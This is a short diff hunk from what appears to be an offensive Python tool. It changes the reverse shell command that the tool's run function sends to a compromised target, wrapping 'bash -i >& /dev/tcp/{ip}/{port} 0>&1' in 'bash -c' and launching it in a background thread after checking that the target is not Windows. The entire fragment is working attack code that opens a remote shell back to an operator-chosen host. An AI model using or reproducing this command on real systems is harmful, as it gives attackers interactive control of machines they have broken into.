@@ -148,7 +148,7 @@ def run(ip: str, port: str, reverse_type: str = "php"):
         if (is_windows()):
             print(color.red("Target system is windows"))
             return
-        command = f"""bash -i >& /dev/tcp/{ip}/{port} 0>&1"""
+        command = f"""bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'"""
         t = Thread(target=send, args=(get_system_code(command),))
         t.setDaemon(True)
         t.start()
